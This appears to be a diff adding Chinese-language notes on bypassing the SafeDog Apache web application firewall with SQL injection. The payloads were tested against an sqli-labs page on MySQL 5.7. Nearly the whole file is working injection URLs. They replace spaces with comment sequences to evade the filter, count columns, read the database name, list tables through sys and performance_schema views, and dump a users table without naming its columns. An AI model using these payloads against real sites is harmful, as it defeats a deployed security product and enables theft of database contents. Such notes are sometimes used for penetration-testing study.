@@ -1,0 +1,31 @@
+测试环境：PHP5.4.45、Apache2.4.39、MySQL5.7.26、网站安全狗(Apache版)3.0最新版
+测试时间：2021.8
+GET：
+字符型注入：
+/*//-//*/  或 /*//--//*/ 或 /*/--/--/*/ 代替空格
+/*//-//*/ 在union select中不好用，后面两种可以
+判断出存在注入：
+http://www.sqli.com/Less-1/?id=1' and/*//-//*/1=1--+
+判断字段数：
+http://www.sqli.com/Less-1/?id=1' order/*//-//*/by 3--+
+联合查询
+回显点：
+http://www.sqli.com/Less-1/?id=1' and/*//--//*/1=2/*//--//*/union/*//--//*/select/*//--//*/1,2,3--+
+获取数据库名：
+http://www.sqli.com/Less-1/?id=1' and/*//--//*/1=2/*//--//*/union/*//--//*/select/*//--//*/1,2,database/*/--/*/()--+
+获取当前库的所有表：（利用5.7新增的库
+			sys的sys.schema_table_statistics_with_buffer
+			同样可用用法一样的还有
+			sys.schema_index_statistics
+			sys.schema_table_statistics
+			sys.x$ps_schema_table_statistics_io //会多个db
+			sys.x$schema_flattened_keys
+			sys.x$schema_index_statistics
+			sys.x$schema_table_statistics
+			sys.x$schema_table_statistics_with_buffer）
+还可以  0x696e666f726d6174696f6e5f736368656d612e7461626c6573 替换 
+http://www.sqli.com/Less-1/?id=1' and/*//--//*/1=2/*//--//*/union/*//--//*/select/*//--//*/1,(select/*//--//*/group_concat(table_name)/*//--//*/from/*//--//*/sys.schema_table_statistics_with_buffer/*//--//*/where/*//--//*/table_schema=database/*//--//*/()),3--+
+特殊的有：http://www.sqli.com/Less-1/?id=1' and/*//--//*/1=2/*//--//*/union/*//--//*/select/*//--//*/1,(select/*//--//*/group_concat(object_name)/*//--//*/from/*//--//*/performance_schema.table_lock_waits_summary_by_table/*//--//*/where/*//--//*/object_schema=database/*//--//*/()),3--+
+获取字段名：
+获取值：
+http://www.sqli.com/Less-1/?id=1' and/*//--//*/1=2/*//--//*/union/*//--//*/select/*//--//*/1,2,(select/*//--//*/group_concat(c)/*//--//*/from/*//--//*/(select/*//--//*/1 a,2 b,3 c/*//--//*/union/*//--//*/select * from/*//--//*/users)x)--+
